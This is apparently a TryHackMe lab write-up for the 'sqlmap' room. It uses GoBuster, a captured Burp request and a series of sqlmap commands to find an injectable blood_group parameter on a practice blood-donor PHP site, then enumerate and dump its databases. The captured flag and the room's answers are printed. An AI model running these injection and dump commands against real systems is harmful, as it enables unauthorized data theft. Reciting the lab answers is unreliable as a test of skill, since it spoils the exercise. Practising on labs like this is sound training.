# Overview

- **Pentester: Taryn Shutlar / WispZero**
- **Time & Date: 10th of October, 8:40 PM**
- **Tools: SQLmap, GoBuster**
- **TryHackMe Room: [sqlmap](https://tryhackme.com/room/sqlmap)**

# Tasks

1. **What is the name of the interesting directory ?**
2. **Who is the current db user?**
3. **What is the final flag?**

starting off using GoBuster, a subdirectory enumeration tool for webapps, I found the subdirectory  `/blood`
navigating to it, I was greeted with a `/index.php` for a blood donar site

## <span style="color: #FFD700;">Therefore, the answer to the 1st question, is the </span> `/blood` <span style="color: #FFD700;"> subdirectory! </span>

using SQLmap, i started by using 

```bash

sqlmap -u http://TARGET/blood --dbs

```

did not yield results

**Report from the command**

```bash
sqlmap -u http://TARGET/blood --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9.9#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:45:59 /2025-10-10/

[20:45:59] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[20:46:03] [INFO] testing connection to the target URL
got a 301 redirect to 'http://TARGET/blood/'. Do you want to follow? [Y/n] Y
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=7r8lrdagrd7...mdnc5ddv24'). Do you want to use those [Y/n] Y
[20:46:10] [INFO] testing if the target URL content is stable
[20:46:11] [WARNING] URI parameter '#1*' does not appear to be dynamic
[20:46:12] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[20:46:12] [INFO] testing for SQL injection on URI parameter '#1*'
[20:46:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:46:16] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:46:17] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:46:19] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[20:46:21] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[20:46:23] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[20:46:25] [INFO] testing 'Generic inline queries'
[20:46:25] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[20:46:27] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[20:46:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[20:46:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:46:32] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[20:46:34] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[20:46:36] [INFO] testing 'Oracle AND time-based blind'


[20:46:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[20:46:50] [WARNING] URI parameter '#1*' does not seem to be injectable
[20:46:50] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[20:46:50] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 72 times

[*] ending @ 20:46:50 /2025-10-10/
```

However, using burp suite, I found a vulnerable parameter to use, and copied it to a file called `o_type.txt`

```http
POST /blood/nl-search.php HTTP/1.1
Host: 10.201.124.65
Content-Length: 16
Cache-Control: max-age=0
Accept-Language: en-GB,en;q=0.9
Origin: http://10.201.124.65
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.201.124.65/blood/nl-search.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=qoo5ch95u6s8irvo11tsje83q7
Connection: keep-alive

blood_group=O%2B
```

# Enumeration

```bash
sqlmap -r o_type.txt -p blood_group --dbs
```

This command tells sqlmap to `-r` read from the provided file and `-p` to target the vulnerable parameter within the file against the website and `--dbs` for enumerating all available databases it can find.

Results:
```bash
[21:08:45] [INFO] fetching database names
available databases [6]:
[*] blood
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] test
```

**`blood`** being what we're interested in most

now, we find the `tables` of `blood`
```bash
sqlmap -r o_type.txt -D blood --tables
```

then using this command to read the `o_type.txt` file, this time without a `-p` as we don't need it, knowing what the `table` is now (`blood`), so we can use `-D` instead with the `--tables` switch to see what tables re within `blood`.

Results:
```plain
[21:45:57] [INFO] fetching tables for database: 'blood'
Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+
```

So now within the `blood` database, we can see there's 3 `tables`

- `blood_db`
- `flag`
- `users`

after having fun exploring the use of `sqlmap`, its time to answer the second question of our task by using the following command:

```bash
sqlmap -r o_type.txt --current-user
```
for this, as usual we're using the `sqlmap` tool to `-r` read the `o-type.txt` file, with the addition of the `--current-user` switch we can confidently see what the current database user is.

**Result:**
```bash
[21:59:25] [INFO] fetching current user
current user: 'root@localhost'
```

## <span style="color: #FFD700;"> The answer to question 2 is </span> `root`<span style="color: #FFD700;">!</span>

Now time to answer question 3 by using the command:
```bash
sqlmap -r o_type.txt -D blood --tables
```
we see that, once again like last time, we see a table called `flag`, highly likely our flag is in there to capture

**Report (again)**
```plain
[22:01:32] [INFO] fetching tables for database: 'blood'
Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+

```

then, with this information, we use the command
```bash
sqlmap -r o-type.txt -D blood -T flag --columns
```
here, we're reading the file, and enumerating through the `blood` database and the `flag` table to find any `columns` for us, which will help out a lot in finding the flag as it further digs deeper into the `blood` database.

**Report**
```plain
[22:01:44] [INFO] fetching columns for table 'flag' in database 'blood'
Database: blood
Table: flag
[3 columns]
+--------+-------------+
| Column | Type        |
+--------+-------------+
| name   | varchar(30) |
| flag   | varchar(50) |
| id     | int(10)     |
+--------+-------------+
```
here, we can see 3 columns have been enumerated, `name`, `flag` and `id`;
we're mainly just interested in `flag` as that contains the answer to the last and final question

(Method 1)
Using the command:
```bash
sqlmap -r o-type.txt -D blood -T flag -C flag --dump
```

**OR**

We could instead `dump` everything from `blood` using the following command:
```bash
sqlmap -r o-type.txt -D blood --dump-all
```


We get:

### Method 1

**Method 1 Report**
```
[22:08:53] [INFO] fetching entries of column(s) 'flag' for table 'flag' in database 'blood'
[22:08:54] [WARNING] reflective value(s) found and filtering out
Database: blood
Table: flag
[1 entry]
+---------------------+
| flag                |
+---------------------+
| thm{sqlm@p_is_L0ve} |
+---------------------+
```

### Method 2

**Method 2 Screenshot:**
![[Pasted image 20251010221719.png]]
**Method 2 Report**
```plain
[22:12:34] [INFO] fetching tables for database: 'blood'
[22:12:34] [INFO] fetching columns for table 'flag' in database 'blood'
[22:12:34] [INFO] fetching entries for table 'flag' in database 'blood'
Database: blood
Table: flag
[1 entry]
+----+---------------------+--------+
| id | flag                | name   |
+----+---------------------+--------+
| 1  | thm{sqlm@p_is_L0ve} | flag   |
+----+---------------------+--------+

[22:12:34] [INFO] table 'blood.flag' dumped to CSV file '/home/ghost/.local/share/sqlmap/output/TARGET/dump/blood/flag.csv'
[22:12:34] [INFO] fetching columns for table 'blood_db' in database 'blood'
[22:12:34] [INFO] fetching entries for table 'blood_db' in database 'blood'
Database: blood
Table: blood_db
[1 entry]
+----+-----+--------+--------+-----------+-------------+--------------+--------------------+
| id | Age | Gender | Name   | Address   | blood_group | Phone_number | email_address      |
+----+-----+--------+--------+-----------+-------------+--------------+--------------------+
| 1  | 27  | MALE   | Nare   | Kathmandu | O+          | 9800000000   | nare@sqlmap.com.np |
+----+-----+--------+--------+-----------+-------------+--------------+--------------------+

[22:12:34] [INFO] table 'blood.blood_db' dumped to CSV file '/home/ghost/.local/share/sqlmap/output/TARGET/dump/blood/blood_db.csv'
[22:12:34] [INFO] fetching columns for table 'users' in database 'blood'
[22:12:34] [INFO] fetching entries for table 'users' in database 'blood'
Database: blood
Table: users
[4 entries]
+----+------------+---------+-----------+----------+----------+-----------+-------------+--------------+-------------------+
| id | dob        | gender  | address   | password | username | full_name | blood_group | phone_number | email_address     |
+----+------------+---------+-----------+----------+----------+-----------+-------------+--------------+-------------------+
| 1  | 12/12/1996 | <blank> | Kathmandu | nare     | nare     | nare      | O+          | 9800000000   | nare@nare.sqlmap  |
| 2  | 12/12/2222 | MALE    | google    | nare     | nare     | google    | A+          | 12345555     | google@google.com |
| 3  | 12/12/2021 | MALE    | google    | google   | google   | GOogle    | A+          | 1234567890   | google@gmail.com  |
| 4  | 11/11/1111 | MALE    | test      | test     | test     | test      | A+          | 123          | test@test.com     |
+----+------------+---------+-----------+----------+----------+-----------+-------------+--------------+-------------------
```

# <span style="color: #FFD700;"> The answer to the final question is </span> `thm{sqlm@p_is_L0ve}`<span style="color: #FFD700;">!</span>

# = FINISH TOOL ROOM =
![[Pasted image 20251010222532.png]]

`yay`
